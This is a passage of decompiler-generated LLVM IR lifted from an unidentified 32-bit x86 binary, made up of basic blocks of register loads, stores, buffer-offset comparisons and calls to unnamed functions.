  %v3_8049550 = load i32, i32* %v2_8049550, align 4
  store i32 %v3_8049550, i32* %edx.global-to-local, align 4
  %v2_8049554 = sub i32 %v3_80495d1, %v1_8049554
  store i32 %v2_8049554, i32* %eax.global-to-local, align 4
  %v2_8049556 = add i32 %v3_8049550, 12
  %v3_8049556 = inttoptr i32 %v2_8049556 to i32*
  store i32 %v2_8049554, i32* %v3_8049556, align 4
  %v0_8049559 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049559 = inttoptr i32 %v0_8049559 to i32*
  %v2_8049559 = load i32, i32* %v1_8049559, align 4
  %v11_8049559 = icmp eq i32 %v2_8049559, 1
  store i1 %v11_8049559, i1* %zf.global-to-local, align 1
  br i1 %v11_8049559, label %dec_label_pc_8049636, label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_8049550, %dec_label_pc_8049636, %dec_label_pc_80495dc
  %v0_8049562 = load i32, i32* @esp, align 4
  %v1_8049562 = add i32 %v0_8049562, 92
  %v2_8049562 = inttoptr i32 %v1_8049562 to i32*
  %v3_8049562 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049562, i32* %ecx.global-to-local, align 4
  %v1_8049566 = add i32 %v3_8049562, 12
  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  %v3_8049566 = load i32, i32* %v2_8049566, align 4
  store i32 %v3_8049566, i32* %eax.global-to-local, align 4
  %v1_8049569 = icmp eq i32 %v3_8049566, 0
  store i1 %v1_8049569, i1* %zf.global-to-local, align 1
  %v1_804956b = icmp eq i1 %v1_8049569, false
  br i1 %v1_804956b, label %dec_label_pc_804958e, label %dec_label_pc_804956d

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8049562
  %v1_804956d = add i32 %v3_8049562, 8
  %v2_804956d = inttoptr i32 %v1_804956d to i32*
  %v3_804956d = load i32, i32* %v2_804956d, align 4
  %v12_804956d = icmp eq i32 %v3_804956d, 1
  store i1 %v12_804956d, i1* %zf.global-to-local, align 1
  br i1 %v12_804956d, label %dec_label_pc_80496da, label %dec_label_pc_8049577

dec_label_pc_8049577:                             ; preds = %dec_label_pc_804956d
  %v3_8049577 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049577, i32* %ecx.global-to-local, align 4
  %v1_804957b = add i32 %v3_8049577, 660
  %v2_804957b = inttoptr i32 %v1_804957b to i32*
  %v3_804957b = load i32, i32* %v2_804957b, align 4
  %v1_8049581 = load i32, i32* @ebx, align 4
  %v2_8049581 = sub i32 %v3_804957b, %v1_8049581
  %v12_8049581 = icmp eq i32 %v2_8049581, 0
  store i32 %v2_8049581, i32* %eax.global-to-local, align 4
  %v2_8049583 = add i32 %v3_8049577, 12
  %v3_8049583 = inttoptr i32 %v2_8049583 to i32*
  store i32 %v2_8049581, i32* %v3_8049583, align 4
  store i1 %v12_8049581, i1* %zf.global-to-local, align 1
  br i1 %v12_8049581, label %dec_label_pc_8049af8, label %dec_label_pc_804958e

dec_label_pc_804958e:                             ; preds = %dec_label_pc_8049577, %dec_label_pc_8049562, %dec_label_pc_80496da, %dec_label_pc_8049764
  %v0_804958e = load i32, i32* @ebx, align 4
  %v1_804958e = icmp eq i32 %v0_804958e, 0
  store i1 %v1_804958e, i1* %zf.global-to-local, align 1
  br i1 %v1_804958e, label %dec_label_pc_80495e0, label %dec_label_pc_8049592

dec_label_pc_8049592:                             ; preds = %dec_label_pc_804958e
  %v0_8049592 = load i32, i32* @esp, align 4
  %v1_8049592 = add i32 %v0_8049592, 92
  %v2_8049592 = inttoptr i32 %v1_8049592 to i32*
  %v3_8049592 = load i32, i32* %v2_8049592, align 4
  store i32 %v3_8049592, i32* %edx.global-to-local, align 4
  %v1_8049596 = add i32 %v3_8049592, 660
  %v2_8049596 = inttoptr i32 %v1_8049596 to i32*
  %v3_8049596 = load i32, i32* %v2_8049596, align 4
  %v2_804959c = sub i32 %v3_8049596, %v0_804958e
  %v12_804959c = icmp eq i32 %v2_804959c, 0
  store i1 %v12_804959c, i1* %zf.global-to-local, align 1
  store i32 %v2_804959c, i32* %eax.global-to-local, align 4
  store i32 %v2_804959c, i32* %v2_8049596, align 4
  %v0_80495a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80495a4 = load i32, i32* @esp, align 4
  %v2_80495a4 = add i32 %v1_80495a4, -4
  %v3_80495a4 = inttoptr i32 %v2_80495a4 to i32*
  store i32 %v0_80495a4, i32* %v3_80495a4, align 4
  %v0_80495a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80495a5 = add i32 %v1_80495a4, -8
  %v3_80495a5 = inttoptr i32 %v2_80495a5 to i32*
  store i32 %v0_80495a5, i32* %v3_80495a5, align 4
  %v0_80495a6 = load i32, i32* @esi, align 4
  %v1_80495a6 = load i32, i32* @ebx, align 4
  %v2_80495a6 = add i32 %v1_80495a6, %v0_80495a6
  store i32 %v2_80495a6, i32* %eax.global-to-local, align 4
  %v2_80495a9 = add i32 %v1_80495a4, -12
  %v3_80495a9 = inttoptr i32 %v2_80495a9 to i32*
  store i32 %v2_80495a6, i32* %v3_80495a9, align 4
  %v0_80495aa = load i32, i32* @esi, align 4
  %v2_80495aa = add i32 %v1_80495a4, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495aa, i32* %v3_80495aa, align 4
  %v4_80495ab = call i32 @function_80526f3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80495ab, i32* %eax.global-to-local, align 4
  %v0_80495b0 = load i32, i32* @esp, align 4
  %v1_80495b0 = add i32 %v0_80495b0, 108
  %v2_80495b0 = inttoptr i32 %v1_80495b0 to i32*
  %v3_80495b0 = load i32, i32* %v2_80495b0, align 4
  store i32 %v3_80495b0, i32* %ecx.global-to-local, align 4
  %v1_80495b4 = add i32 %v0_80495b0, 92
  %v2_80495b4 = inttoptr i32 %v1_80495b4 to i32*
  %v3_80495b4 = load i32, i32* %v2_80495b4, align 4
  store i32 %v3_80495b4, i32* %edx.global-to-local, align 4
  %v1_80495b8 = add i32 %v3_80495b0, 660
  %v2_80495b8 = inttoptr i32 %v1_80495b8 to i32*
  %v3_80495b8 = load i32, i32* %v2_80495b8, align 4
  store i32 %v3_80495b8, i32* %eax.global-to-local, align 4
  %v1_80495c1 = icmp eq i32 %v3_80495b8, 0
  store i1 %v1_80495c1, i1* %zf.global-to-local, align 1
  %v2_80495c3 = add i32 %v3_80495b4, 2116
  %v3_80495c3 = add i32 %v2_80495c3, %v3_80495b8
  %v4_80495c3 = inttoptr i32 %v3_80495c3 to i8*
  store i8 0, i8* %v4_80495c3, align 1
  %v0_80495cb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80495cb, label %dec_label_pc_80495e0, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049592
  %v0_80495cd = load i32, i32* @esp, align 4
  %v1_80495cd = add i32 %v0_80495cd, 92
  %v2_80495cd = inttoptr i32 %v1_80495cd to i32*
  %v3_80495cd = load i32, i32* %v2_80495cd, align 4
  store i32 %v3_80495cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_80495d1:                             ; preds = %dec_label_pc_8049521, %dec_label_pc_80495cd
  %v0_8049542 = phi i32 [ %v0_80495d1.pre, %dec_label_pc_8049521 ], [ %v3_80495cd, %dec_label_pc_80495cd ]
  %v1_80495d1 = add i32 %v0_8049542, 12
  %v2_80495d1 = inttoptr i32 %v1_80495d1 to i32*
  %v3_80495d1 = load i32, i32* %v2_80495d1, align 4
  store i32 %v3_80495d1, i32* %eax.global-to-local, align 4
  %v1_80495d4 = icmp eq i32 %v3_80495d1, 0
  store i1 %v1_80495d4, i1* %zf.global-to-local, align 1
  %tmp145 = icmp slt i32 %v3_80495d1, 1
  %tmp146 = icmp eq i1 %tmp145, false
  br i1 %tmp146, label %dec_label_pc_8049542, label %dec_label_pc_80495dc

dec_label_pc_80495dc:                             ; preds = %dec_label_pc_80495d1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8049562

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_8049592, %dec_label_pc_804958e
  %v0_80495e0 = load i32, i32* @esp, align 4
  %v1_80495e0 = add i32 %v0_80495e0, 92
  %v2_80495e0 = inttoptr i32 %v1_80495e0 to i32*
  %v3_80495e0 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495e0, i32* %eax.global-to-local, align 4
  %v1_80495e4 = add i32 %v3_80495e0, -1448
  %v2_80495e4 = inttoptr i32 %v1_80495e4 to i8*
  %v3_80495e4 = load i8, i8* %v2_80495e4, align 1
  %v12_80495e4 = icmp eq i8 %v3_80495e4, 7
  store i1 %v12_80495e4, i1* %zf.global-to-local, align 1
  %v1_80495eb = icmp eq i1 %v12_80495e4, false
  br i1 %v1_80495eb, label %dec_label_pc_8048d91, label %dec_label_pc_80495f1

dec_label_pc_80495f1:                             ; preds = %dec_label_pc_80495e0
  %v3_80495f1 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495f1, i32* %edx.global-to-local, align 4
  %v1_80495f5 = add i32 %v3_80495f1, 660
  %v2_80495f5 = inttoptr i32 %v1_80495f5 to i32*
  %v3_80495f5 = load i32, i32* %v2_80495f5, align 4
  %v9_80495f5 = icmp eq i32 %v3_80495f5, 1024
  store i1 %v9_80495f5, i1* %zf.global-to-local, align 1
  %v1_80495ff = icmp eq i1 %v9_80495f5, false
  br i1 %v1_80495ff, label %dec_label_pc_80494dc, label %dec_label_pc_8049605

dec_label_pc_8049605:                             ; preds = %dec_label_pc_80495f1, %dec_label_pc_80494af
  %v1_8049605 = phi i32 [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80495e0, %dec_label_pc_80495f1 ]
  %v0_8049605 = phi i32 [ %v1_80494af, %dec_label_pc_80494af ], [ %v3_80495e0, %dec_label_pc_80495f1 ]
  %v2_8049605 = add i32 %v1_8049605, -4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  store i32 %v0_8049605, i32* %v3_8049605, align 4
  %v1_8049606 = add i32 %v1_8049605, -8
  %v2_8049606 = inttoptr i32 %v1_8049606 to i32*
  store i32 960, i32* %v2_8049606, align 4
  %v1_804960b = add i32 %v1_8049605, 76
  %v2_804960b = inttoptr i32 %v1_804960b to i32*
  %v3_804960b = load i32, i32* %v2_804960b, align 4
  %v1_804960f = add i32 %v3_804960b, 2180
  %v9_804960f = icmp eq i32 %v1_804960f, 0
  store i1 %v9_804960f, i1* %zf.global-to-local, align 1
  store i32 %v1_804960f, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v1_8049605, -12
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v1_804960f, i32* %v3_8049614, align 4
  %v0_8049615 = load i32, i32* @esi, align 4
  %v2_8049615 = add i32 %v1_8049605, -16
  %v3_8049615 = inttoptr i32 %v2_8049615 to i32*
  store i32 %v0_8049615, i32* %v3_8049615, align 4
  %v4_8049616 = call i32 @function_80526f3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v0_804961b = load i32, i32* @esp, align 4
  %v1_804961b = add i32 %v0_804961b, 108
  %v2_804961b = inttoptr i32 %v1_804961b to i32*
  %v3_804961b = load i32, i32* %v2_804961b, align 4
  store i32 %v3_804961b, i32* %ecx.global-to-local, align 4
  %v1_804961f = add i32 %v3_804961b, 660
  %v2_804961f = inttoptr i32 %v1_804961f to i32*
  %v3_804961f = load i32, i32* %v2_804961f, align 4
  %v1_8049628 = add i32 %v3_804961f, -64
  %v6_8049628 = icmp eq i32 %v1_8049628, 0
  store i1 %v6_8049628, i1* %zf.global-to-local, align 1
  store i32 %v1_8049628, i32* %eax.global-to-local, align 4
  store i32 %v1_8049628, i32* %v2_804961f, align 4
  %v0_80494dc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494dc

dec_label_pc_8049636:                             ; preds = %dec_label_pc_8049550
  %v0_8049636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049636 = load i32, i32* @esp, align 4
  %v2_8049636 = add i32 %v1_8049636, -4
  %v3_8049636 = inttoptr i32 %v2_8049636 to i32*
  store i32 %v0_8049636, i32* %v3_8049636, align 4
  %v0_8049637 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049637 = add i32 %v1_8049636, -8
  %v3_8049637 = inttoptr i32 %v2_8049637 to i32*
  store i32 %v0_8049637, i32* %v3_8049637, align 4
  %v1_8049638 = add i32 %v1_8049636, -12
  %v2_8049638 = inttoptr i32 %v1_8049638 to i32*
  store i32 0, i32* %v2_8049638, align 4
  %v1_804963a = add i32 %v1_8049636, -16
  %v2_804963a = inttoptr i32 %v1_804963a to i32*
  store i32 36, i32* %v2_804963a, align 4
  %v3_804963c = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804963c, i32* %eax.global-to-local, align 4
  %v0_8049641 = load i32, i32* @esp, align 4
  %v1_8049641 = add i32 %v0_8049641, -4
  %v2_8049641 = inttoptr i32 %v1_8049641 to i32*
  store i32 11, i32* %v2_8049641, align 4
  %v2_8049643 = add i32 %v0_8049641, -8
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v3_804963c, i32* %v3_8049643, align 4
  %v1_8049644 = add i32 %v0_8049641, 108
  %v2_8049644 = inttoptr i32 %v1_8049644 to i32*
  %v3_8049644 = load i32, i32* %v2_8049644, align 4
  store i32 %v3_8049644, i32* %ecx.global-to-local, align 4
  %v1_8049648 = add i32 %v3_8049644, 660
  %v2_8049648 = inttoptr i32 %v1_8049648 to i32*
  %v3_8049648 = load i32, i32* %v2_8049648, align 4
  store i32 %v3_8049648, i32* %eax.global-to-local, align 4
  %v2_804964e = add i32 %v0_8049641, -12
  %v3_804964e = inttoptr i32 %v2_804964e to i32*
  store i32 %v3_8049648, i32* %v3_804964e, align 4
  %v0_804964f = load i32, i32* @esi, align 4
  %v2_804964f = add i32 %v0_8049641, -16
  %v3_804964f = inttoptr i32 %v2_804964f to i32*
  store i32 %v0_804964f, i32* %v3_804964f, align 4
  %v0_8049650 = call i32 @function_8051ca0()
  %v0_8049655 = load i32, i32* @esp, align 4
  %v1_8049658 = add i32 %v0_8049650, 1
  %v8_8049658 = icmp eq i32 %v1_8049658, 0
  store i1 %v8_8049658, i1* %zf.global-to-local, align 1
  store i32 %v1_8049658, i32* %eax.global-to-local, align 4
  br i1 %v8_8049658, label %dec_label_pc_8049562, label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_8049636
  %v2_804965f = add i32 %v0_8049655, 28
  %v3_804965f = inttoptr i32 %v2_804965f to i32*
  store i32 %v1_8049658, i32* %v3_804965f, align 4
  %v0_8049660 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049660 = add i32 %v0_8049655, 24
  %v3_8049660 = inttoptr i32 %v2_8049660 to i32*
  store i32 %v0_8049660, i32* %v3_8049660, align 4
  %v1_8049661 = add i32 %v0_8049655, 20
  %v2_8049661 = inttoptr i32 %v1_8049661 to i32*
  store i32 0, i32* %v2_8049661, align 4
  %v1_8049663 = add i32 %v0_8049655, 16
  %v2_8049663 = inttoptr i32 %v1_8049663 to i32*
  store i32 36, i32* %v2_8049663, align 4
  %v3_8049665 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v0_804966a = load i32, i32* @esp, align 4
  %v1_804966a = add i32 %v0_804966a, -4
  %v2_804966a = inttoptr i32 %v1_804966a to i32*
  store i32 11, i32* %v2_804966a, align 4
  %v2_804966c = add i32 %v0_804966a, -8
  %v3_804966c = inttoptr i32 %v2_804966c to i32*
  store i32 %v3_8049665, i32* %v3_804966c, align 4
  %v1_804966d = add i32 %v0_804966a, 108
  %v2_804966d = inttoptr i32 %v1_804966d to i32*
  %v3_804966d = load i32, i32* %v2_804966d, align 4
  store i32 %v3_804966d, i32* %eax.global-to-local, align 4
  %v1_8049671 = add i32 %v3_804966d, 660
  %v2_8049671 = inttoptr i32 %v1_8049671 to i32*
  %v3_8049671 = load i32, i32* %v2_8049671, align 4
  store i32 %v3_8049671, i32* %eax.global-to-local, align 4
  %v2_8049677 = add i32 %v0_804966a, -12
  %v3_8049677 = inttoptr i32 %v2_8049677 to i32*
  store i32 %v3_8049671, i32* %v3_8049677, align 4
  %v0_8049678 = load i32, i32* @esi, align 4
  %v2_8049678 = add i32 %v0_804966a, -16
  %v3_8049678 = inttoptr i32 %v2_8049678 to i32*
  store i32 %v0_8049678, i32* %v3_8049678, align 4
  %v0_8049679 = call i32 @function_8051ca0()
  store i32 %v0_8049679, i32* %eax.global-to-local, align 4
  %v0_804967e = load i32, i32* @esp, align 4
  %v1_8049681 = add i32 %v0_804967e, 28
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  store i32 1, i32* %v2_8049681, align 4
  %v1_8049683 = add i32 %v0_804967e, 24
  %v2_8049683 = inttoptr i32 %v1_8049683 to i32*
  store i32 ptrtoint (i32* @global_var_8054ada.16 to i32), i32* %v2_8049683, align 4
  %v1_8049688 = add i32 %v0_804967e, 124
  %v2_8049688 = inttoptr i32 %v1_8049688 to i32*
  %v3_8049688 = load i32, i32* %v2_8049688, align 4
  store i32 %v3_8049688, i32* %edx.global-to-local, align 4
  store i32 %v0_8049679, i32* @ebx, align 4
  %v0_804968e = load i32, i32* @esi, align 4
  %v2_804968e = add i32 %v0_804968e, %v0_8049679
  store i32 %v2_804968e, i32* @edi, align 4
  %v1_8049691 = add i32 %v3_8049688, 660
  %v2_8049691 = inttoptr i32 %v1_8049691 to i32*
  %v3_8049691 = load i32, i32* %v2_8049691, align 4
  %v2_8049697 = sub i32 %v3_8049691, %v0_8049679
  %v12_8049697 = icmp eq i32 %v2_8049697, 0
  store i1 %v12_8049697, i1* %zf.global-to-local, align 1
  store i32 %v2_8049697, i32* %eax.global-to-local, align 4
  %v2_8049699 = add i32 %v0_804967e, 20
  %v3_8049699 = inttoptr i32 %v2_8049699 to i32*
  store i32 %v2_8049697, i32* %v3_8049699, align 4
  %v0_804969a = load i32, i32* @edi, align 4
  %v2_804969a = add i32 %v0_804967e, 16
  %v3_804969a = inttoptr i32 %v2_804969a to i32*
  store i32 %v0_804969a, i32* %v3_804969a, align 4
  %v0_804969b = call i32 @function_8051ca0()
  store i32 %v0_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v1_80496a0 = add i32 %v0_80496a0, 92
  %v2_80496a0 = inttoptr i32 %v1_80496a0 to i32*
  %v3_80496a0 = load i32, i32* %v2_80496a0, align 4
  store i32 %v3_80496a0, i32* %ecx.global-to-local, align 4
  %v0_80496a4 = load i32, i32* @ebx, align 4
  %v2_80496a4 = add i32 %v0_80496a4, %v0_804969b
  store i32 %v2_80496a4, i32* @ebx, align 4
  %v2_80496a6 = add i32 %v0_80496a0, 56
  %v3_80496a6 = inttoptr i32 %v2_80496a6 to i32*
  store i32 %v2_80496a4, i32* %v3_80496a6, align 4
  %v0_80496ad = load i32, i32* @ebx, align 4
  %v1_80496ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80496ad = add i32 %v0_80496ad, 2115
  %v3_80496ad = add i32 %v2_80496ad, %v1_80496ad
  %v4_80496ad = inttoptr i32 %v3_80496ad to i8*
  store i8 0, i8* %v4_80496ad, align 1
  %v0_80496b5 = load i32, i32* @esp, align 4
  %v1_80496b5 = add i32 %v0_80496b5, 92
  %v2_80496b5 = inttoptr i32 %v1_80496b5 to i32*
  %v3_80496b5 = load i32, i32* %v2_80496b5, align 4
  store i32 %v3_80496b5, i32* %eax.global-to-local, align 4
  %v1_80496b9 = add i32 %v3_80496b5, 16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  %v3_80496b9 = load i32, i32* %v2_80496b9, align 4
  %v4_80496b9 = add i32 %v3_80496b9, -4
  %v9_80496b9 = sub i32 3, %v3_80496b9
  %v10_80496b9 = and i32 %v9_80496b9, %v3_80496b9
  %v11_80496b9 = icmp slt i32 %v10_80496b9, 0
  %v12_80496b9 = icmp eq i32 %v4_80496b9, 0
  store i1 %v12_80496b9, i1* %zf.global-to-local, align 1
  %v13_80496b9 = icmp slt i32 %v4_80496b9, 0
  %v3_80496bd = icmp ne i1 %v13_80496b9, %v11_80496b9
  %v4_80496bd = or i1 %v12_80496b9, %v3_80496bd
  br i1 %v4_80496bd, label %dec_label_pc_8049da3, label %dec_label_pc_80496c3

dec_label_pc_80496c3:                             ; preds = %dec_label_pc_8049da3, %dec_label_pc_804965f, %dec_label_pc_8049db8
  %v0_80496c3 = phi i32 [ %v1_8049dac, %dec_label_pc_8049da3 ], [ %v0_80496b5, %dec_label_pc_804965f ], [ %v0_80496c3.pre, %dec_label_pc_8049db8 ]
  %v1_80496c3 = add i32 %v0_80496c3, 92
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %edx.global-to-local, align 4
  %v1_80496c7 = add i32 %v3_80496c3, 12
  %v2_80496c7 = inttoptr i32 %v1_80496c7 to i32*
  store i32 -1, i32* %v2_80496c7, align 4
  %v0_80496ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80496ce = add i32 %v0_80496ce, -1448
  %v2_80496ce = inttoptr i32 %v1_80496ce to i8*
  store i8 10, i8* %v2_80496ce, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80496da:                             ; preds = %dec_label_pc_804956d
  %v1_80496da = add i32 %v0_8049562, -4
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  store i32 2, i32* %v2_80496da, align 4
  %v1_80496dc = add i32 %v0_8049562, -8
  %v2_80496dc = inttoptr i32 %v1_80496dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_80496dc, align 4
  %v0_80496e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80496e1 = add i32 %v0_80496e1, 660
  %v2_80496e1 = inttoptr i32 %v1_80496e1 to i32*
  %v3_80496e1 = load i32, i32* %v2_80496e1, align 4
  store i32 %v3_80496e1, i32* %eax.global-to-local, align 4
  %v2_80496e7 = add i32 %v0_8049562, -12
  %v3_80496e7 = inttoptr i32 %v2_80496e7 to i32*
  store i32 %v3_80496e1, i32* %v3_80496e7, align 4
  %v0_80496e8 = load i32, i32* @esi, align 4
  %v2_80496e8 = add i32 %v0_8049562, -16
  %v3_80496e8 = inttoptr i32 %v2_80496e8 to i32*
  store i32 %v0_80496e8, i32* %v3_80496e8, align 4
  %v0_80496e9 = call i32 @function_8051ca0()
  %v0_80496ee = load i32, i32* @esp, align 4
  %v1_80496f1 = add i32 %v0_80496e9, 1
  %v8_80496f1 = icmp eq i32 %v1_80496f1, 0
  store i1 %v8_80496f1, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f1, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f1, label %dec_label_pc_804958e, label %dec_label_pc_80496f8

dec_label_pc_80496f8:                             ; preds = %dec_label_pc_80496da
  %v1_80496f8 = add i32 %v0_80496ee, 12
  %v2_80496f8 = inttoptr i32 %v1_80496f8 to i32*
  store i32 2, i32* %v2_80496f8, align 4
  %v1_80496fa = add i32 %v0_80496ee, 8
  %v2_80496fa = inttoptr i32 %v1_80496fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_80496fa, align 4
  %v1_80496ff = add i32 %v0_80496ee, 108
  %v2_80496ff = inttoptr i32 %v1_80496ff to i32*
  %v3_80496ff = load i32, i32* %v2_80496ff, align 4
  store i32 %v3_80496ff, i32* %eax.global-to-local, align 4
  %v1_8049703 = add i32 %v3_80496ff, 660
  %v2_8049703 = inttoptr i32 %v1_8049703 to i32*
  %v3_8049703 = load i32, i32* %v2_8049703, align 4
  %v2_8049709 = add i32 %v0_80496ee, 4
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v3_8049703, i32* %v3_8049709, align 4
  %v0_804970a = load i32, i32* @esi, align 4
  %v3_804970a = inttoptr i32 %v0_80496ee to i32*
  store i32 %v0_804970a, i32* %v3_804970a, align 4
  %v0_804970b = call i32 @function_8051ca0()
  store i32 %v0_804970b, i32* %eax.global-to-local, align 4
  %v0_8049710 = load i32, i32* @esp, align 4
  %v1_8049710 = add i32 %v0_8049710, 92
  %v2_8049710 = inttoptr i32 %v1_8049710 to i32*
  %v3_8049710 = load i32, i32* %v2_8049710, align 4
  store i32 %v3_8049710, i32* %edx.global-to-local, align 4
  store i32 %v0_804970b, i32* @ebx, align 4
  %v2_8049716 = add i32 %v0_804970b, 2114
  %v3_8049716 = add i32 %v2_8049716, %v3_8049710
  %v4_8049716 = inttoptr i32 %v3_8049716 to i8*
  store i8 0, i8* %v4_8049716, align 1
  %v0_804971e = load i32, i32* @esp, align 4
  %v1_804971e = add i32 %v0_804971e, -4
  %v2_804971e = inttoptr i32 %v1_804971e to i32*
  store i32 1, i32* %v2_804971e, align 4
  %v1_8049720 = add i32 %v0_804971e, -8
  %v2_8049720 = inttoptr i32 %v1_8049720 to i32*
  store i32 ptrtoint (i32* @global_var_8054ac9.14 to i32), i32* %v2_8049720, align 4
  %v2_8049725 = add i32 %v0_804971e, -12
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v0_804970b, i32* %v3_8049725, align 4
  %v0_8049726 = load i32, i32* @esi, align 4
  %v2_8049726 = add i32 %v0_804971e, -16
  %v3_8049726 = inttoptr i32 %v2_8049726 to i32*
  store i32 %v0_8049726, i32* %v3_8049726, align 4
  %v0_8049727 = call i32 @function_8051ca0()
  %v0_804972c = load i32, i32* @esp, align 4
  %v1_804972c = add i32 %v0_804972c, 32
  %v1_804972f = add i32 %v0_8049727, 1
  %v8_804972f = icmp eq i32 %v1_804972f, 0
  store i1 %v8_804972f, i1* %zf.global-to-local, align 1
  store i32 %v1_804972f, i32* %eax.global-to-local, align 4
  br i1 %v8_804972f, label %dec_label_pc_804974f, label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %dec_label_pc_80496f8
  %v1_8049732 = add i32 %v0_804972c, 28
  %v2_8049732 = inttoptr i32 %v1_8049732 to i32*
  store i32 1, i32* %v2_8049732, align 4
  %v1_8049734 = add i32 %v0_804972c, 24
  %v2_8049734 = inttoptr i32 %v1_8049734 to i32*
  store i32 ptrtoint (i32* @global_var_8054ac9.14 to i32), i32* %v2_8049734, align 4
  %v0_8049739 = load i32, i32* @ebx, align 4
  %v2_8049739 = add i32 %v0_804972c, 20
  %v3_8049739 = inttoptr i32 %v2_8049739 to i32*
  store i32 %v0_8049739, i32* %v3_8049739, align 4
  %v0_804973a = load i32, i32* @esi, align 4
  %v2_804973a = add i32 %v0_804972c, 16
  %v3_804973a = inttoptr i32 %v2_804973a to i32*
  store i32 %v0_804973a, i32* %v3_804973a, align 4
  %v0_804973b = call i32 @function_8051ca0()
  store i32 %v0_804973b, i32* %eax.global-to-local, align 4
  %v0_8049740 = load i32, i32* @esp, align 4
  %v1_8049740 = add i32 %v0_8049740, 92
  %v2_8049740 = inttoptr i32 %v1_8049740 to i32*
  %v3_8049740 = load i32, i32* %v2_8049740, align 4
  store i32 %v3_8049740, i32* @ecx, align 4
  %v6_8049744 = icmp eq i32 %v0_8049740, -16
  store i1 %v6_8049744, i1* %zf.global-to-local, align 1
  %v2_8049747 = add i32 %v0_804973b, 2116
  %v3_8049747 = add i32 %v2_8049747, %v3_8049740
  %v4_8049747 = inttoptr i32 %v3_8049747 to i8*
  store i8 0, i8* %v4_8049747, align 1
  %v1_804974f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_80496f8, %dec_label_pc_8049732
  %v1_804974f = phi i32 [ %v1_804972c, %dec_label_pc_80496f8 ], [ %v1_804974f.pre, %dec_label_pc_8049732 ]
  %v0_804974f = load i32, i32* @ecx, align 4
  %v2_804974f = add i32 %v1_804974f, -4
  %v3_804974f = inttoptr i32 %v2_804974f to i32*
  store i32 %v0_804974f, i32* %v3_804974f, align 4
  %v0_8049750 = load i32, i32* @ecx, align 4
  %v2_8049750 = add i32 %v1_804974f, -8
  %v3_8049750 = inttoptr i32 %v2_8049750 to i32*
  store i32 %v0_8049750, i32* %v3_8049750, align 4
  %v1_8049751 = add i32 %v1_804974f, -12
  %v2_8049751 = inttoptr i32 %v1_8049751 to i32*
  store i32 16, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @esi, align 4
  %v2_8049753 = add i32 %v1_804974f, -16
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v3_8049754 = call i32 @function_8051cf0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049754, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v1_804975c = icmp eq i32 %v3_8049754, 0
  store i1 %v1_804975c, i1* %zf.global-to-local, align 1
  %v1_8049e5a = add i32 %v0_8049759, 108
  %v2_8049e5a = inttoptr i32 %v1_8049e5a to i32*
  %v3_8049e5a = load i32, i32* %v2_8049e5a, align 4
  br i1 %v1_804975c, label %dec_label_pc_8049e5a, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804974f
